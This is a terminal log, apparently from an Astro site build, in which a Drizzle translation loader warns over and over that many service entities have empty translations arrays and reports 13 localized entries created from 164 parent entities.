[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-be30a165 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b151570e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-04c22692 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-718eb0cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-106f3a7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8134bd48 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7f707bea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7fd85cae has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7b5fad44 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6b53607c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4a41bde has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b670fb19 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-037f6f0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-befe1f2c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-cf49f35d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-786371d0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d50fda7c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ffbc9923 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13446ffe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18e50657 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-15e2a589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d5304933 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dbd0a284 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b44634f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-740e7a11 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-728293f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7890a594 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5c8b291f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-522ed44d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-869af36d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d413dd8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38b50d5d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47528800 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-21cf0b9a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f81acf1a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f3ddeab5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-120d5cac has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2d3ff5a3 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-88ebbd55 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5fed9429 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1066ee9f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1e5b258b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-374f73f0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c13580f2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b41de161 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d20767f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13017b6d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4fa98cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-58c974ff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acf1541e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38d95f75 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6a80558 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39536420 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ec51a1d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-83c379d1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-198755b4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d1fc560 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2859c74b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c37c2433 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3ad7e563 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2368a3a2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-0a631f1e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98339492 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6cc6d20 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-17ea2aad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f544f37 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ad4b1452 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1beb50d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-257c96da has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bf93e13f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-69be50ea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-11e90d7b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d26859a0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-44ebf015 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d81e3f7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-10281057 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4dadbcc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4fc5c4de has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7443bbd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e34a43d2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9216e86e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e5ab8d0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-655d9b87 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1dd4e1fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d6eceb9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-41579eef has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:23:44[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 13 localized entries in Astro Content Layer.
[2m20:23:44[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 164 parent entities.
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3cdaa9fb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fd8e4bc4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-33fb5d39 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-35db7427 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d5a4adf has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3324e589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3dbba740 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4f84b975 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c6bd8108 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6e434fad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4445fe7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-210de9b1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7774cf90 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dc7ba910 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-394f1543 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-52a7de43 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bfaab9c6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-725a5050 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db84c061 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f637349 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9895c9db has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f6c6f302 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-773f0211 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6c6267cd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d525a37b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47085c49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6fdf587a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-aa465471 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-34efb0dc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c1421460 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1a0b4cb0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9531d171 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b7f4d73a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7f7ca00 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5bbf47fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8e054462 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a01cf796 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7aaf63f5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4c3f3986 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98e12337 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2c394312 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d99e5924 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5e5fa063 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a209cf34 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ebde45c8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b902dd5e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6bd4a782 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18ca384f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c16b8687 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b9f0a49e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d439c329 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acd54078 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b5252eff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-895714b0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b4d5ca49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d207bac7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fae34b96 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5248e68e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39e22a61 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b6dea38b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-76b83851 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b58ee3b2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-afd81398 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e7c73a7f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-663a4445 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-960a3a6f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-90f2c4c9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-59fe6d1d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db4f9df2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f889093e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-45012c0c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-be30a165 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b151570e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-04c22692 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-718eb0cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-106f3a7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8134bd48 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7f707bea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7fd85cae has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7b5fad44 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6b53607c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4a41bde has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b670fb19 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-037f6f0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-befe1f2c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-cf49f35d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-786371d0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
